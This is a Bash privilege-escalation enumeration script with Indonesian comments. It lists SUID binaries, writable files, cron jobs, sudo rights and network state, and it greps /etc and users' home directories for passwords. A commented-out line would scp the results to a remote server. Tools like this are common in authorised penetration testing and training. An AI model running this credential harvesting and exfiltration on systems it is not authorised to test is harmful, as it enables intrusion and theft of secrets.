#!/bin/bash

# Judul: Linux Privilege Escalation Enumeration Script
# Deskripsi: Mengumpulkan informasi sistem dan potensi konfigurasi yang salah untuk eskalasi hak istimewa
# Penulis: Nama Anda
# Tanggal: YYYY-MM-DD

OUTPUT="enum-results.txt"

echo "[+] Mengumpulkan informasi sistem..." | tee -a $OUTPUT

echo "[+] Hostname:" | tee -a $OUTPUT
hostname | tee -a $OUTPUT

echo "[+] Informasi kernel:" | tee -a $OUTPUT
uname -a | tee -a $OUTPUT

echo "[+] Informasi rilis OS:" | tee -a $OUTPUT
cat /etc/*release | tee -a $OUTPUT

echo "[+] Pengguna saat ini:" | tee -a $OUTPUT
whoami | tee -a $OUTPUT

echo "[+] ID pengguna saat ini dan grup:" | tee -a $OUTPUT
id | tee -a $OUTPUT

echo "[+] Variabel lingkungan:" | tee -a $OUTPUT
env | tee -a $OUTPUT

echo "[+] Direktori saat ini:" | tee -a $OUTPUT
pwd | tee -a $OUTPUT

echo "[+] Isi direktori home:" | tee -a $OUTPUT
ls -la ~ | tee -a $OUTPUT


echo "[+] Memeriksa binary SUID..." | tee -a $OUTPUT
find / -perm -4000 -type f 2>/dev/null | tee -a $OUTPUT

echo "[+] Memeriksa binary SGID..." | tee -a $OUTPUT
find / -perm -2000 -type f 2>/dev/null | tee -a $OUTPUT

echo "[+] File yang dapat ditulis oleh semua pengguna:" | tee -a $OUTPUT
find / -type f -perm -o+w 2>/dev/null | tee -a $OUTPUT

echo "[+] Direktori yang dapat ditulis oleh semua pengguna:" | tee -a $OUTPUT
find / -type d -perm -o+w 2>/dev/null | tee -a $OUTPUT

echo "[+] Memeriksa file yang dimiliki oleh pengguna saat ini di lokasi sensitif..." | tee -a $OUTPUT
find /etc /var /usr /opt /home -user $(whoami) 2>/dev/null | tee -a $OUTPUT

echo "[+] Entri crontab untuk pengguna saat ini:" | tee -a $OUTPUT
crontab -l | tee -a $OUTPUT

echo "[+] Entri crontab di seluruh sistem:" | tee -a $OUTPUT
cat /etc/crontab | tee -a $OUTPUT

echo "[+] Memeriksa izin file yang lemah di direktori home..." | tee -a $OUTPUT
for user in $(ls /home); do
    echo "Izin untuk /home/$user:" | tee -a $OUTPUT
    ls -la /home/$user | tee -a $OUTPUT
done

echo "[+] Proses yang berjalan sebagai root:" | tee -a $OUTPUT
ps aux | grep root | tee -a $OUTPUT

echo "[+] Paket yang terpasang dan versinya:" | tee -a $OUTPUT
dpkg -l | tee -a $OUTPUT

echo "[+] Antarmuka jaringan dan alamat IP:" | tee -a $OUTPUT
ifconfig -a | tee -a $OUTPUT

echo "[+] Koneksi jaringan yang mendengarkan:" | tee -a $OUTPUT
netstat -tuln | tee -a $OUTPUT

echo "[+] Koneksi jaringan aktif:" | tee -a $OUTPUT
netstat -antp | tee -a $OUTPUT

echo "[+] Memeriksa eksport NFS yang dikonfigurasi secara salah..." | tee -a $OUTPUT
showmount -e | tee -a $OUTPUT

echo "[+] Mencari kredensial dalam file konfigurasi..." | tee -a $OUTPUT
grep -rEi 'password|pass|pwd' /etc 2>/dev/null | tee -a $OUTPUT

echo "[+] Mencari kredensial dalam direktori home..." | tee -a $OUTPUT
for user in $(ls /home); do
    echo "Mencari di /home/$user:" | tee -a $OUTPUT
    grep -rEi 'password|pass|pwd' /home/$user 2>/dev/null | tee -a $OUTPUT
done
# aplikasi yang dapat digunakan
echo "[+] Mencari aplikasi yang dapat digunakan..." | tee -a $OUTPUT
find / -type f -perm -o+x 2>/dev/null | tee -a $OUTPUT

echo "[+] Versi Sudo:" | tee -a $OUTPUT
sudo -V | head -n 1 | tee -a $OUTPUT

echo "[+] Hak sudo untuk pengguna saat ini:" | tee -a $OUTPUT
sudo -l | tee -a $OUTPUT

echo "[+] Enumeration selesai. Hasil disimpan di $OUTPUT."

# Opsional: Unggah hasil ke server remote (gunakan dengan hati-hati)
# scp $OUTPUT user@remote-server:/path/to/save/
